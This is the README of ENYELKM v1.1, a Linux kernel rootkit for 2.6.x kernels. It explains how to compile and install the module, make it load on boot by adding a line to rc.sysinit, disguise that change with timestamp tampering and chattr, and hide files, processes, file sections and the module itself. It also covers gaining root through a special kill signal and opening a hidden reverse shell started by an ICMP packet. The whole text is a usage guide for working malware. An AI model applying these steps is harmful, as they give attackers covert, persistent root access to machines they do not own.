 -----------------------------------
   ENYELKM v1.1  |  by RaiSe
   Linux Rootkit x86 kernel v2.6.x
   < raise@enye-sec.org >
   < http://www.enye-sec.org >
 -----------------------------------


 Tested on kernels:  + v2.6.3  + v2.6.14  + v2.6.11-1.1369_FC4


 Compile:

   # make

 Install:

   # make install

 Compile only reverse_shell connect utility:

   # make connect


 * Make install does:

 - Copy enyelkm.ko file to '/etc/.enyelkmHIDE^IT.ko', so when LKM
 is loaded that file will be hidden. 

 - Add the string 'insmod /etc/.enyelkmHIDE^IT.ko' between the marks
 #<HIDE_8762> and #</HIDE_8762> to /etc/rc.d/rc.sysinit file. So
 when LKM is loaded these lines will be hidden (it is explained after).

 - Load LKM with 'insmod /etc/.enyelkmHIDE^IT.ko'.

 - Try modify date of /etc/rc.d/rc.sysinit file with date from
 /etc/rc.d/rc, and set +i attribute to /etc/.enyelkmHIDE^IT.ko
 with touch and chattr commands.


 * Hide files, directories and processes:

 Every file, directory and process with substring 'HIDE^IT' on
 his name is hidden. Processes with gid = 0x489196ab are hidden
 too. Reverse shell (after is explained) run with gid = 0x489196ab, so
 it and every process launched from it is hidden.


 * Hide chunks inside a file:

 Every byte between the marks is hidden:
 (marks included)

 #<HIDE_8762>
 text to hide
 #</HIDE_8762>


 * Get local root:

 Doing: # kill -s 58 12345
 you get id 0.


 * Hide module to 'lsmod':

 LKM is auto hidden.


 * Hide module to '/sys/module':

 Rename LKM (.ko) to a name with substring HIDE^IT in his name before
 load it with insmod (as 'make install' do).


 * Remote access:

 Use utility 'connect' for it. Run it: './connect ip_computer_with_lkm'. It
 sends a special ICMP, open a port and receive the reverse shell. For exit
 shell: control+c. The connection is hidden to 'netstat' in computer with
 LKM.


 * Uninstall LKM:

 Restart the computer. If you made 'make install', edit /etc/rc.d/rc.sysinit
 with a text editor and save it. The editor will not 'see' the hidden lines
 and it will not save them. After it restart computer. You can test if LKM
 is loaded doing: 'kill -s 58 12345'.



EOF
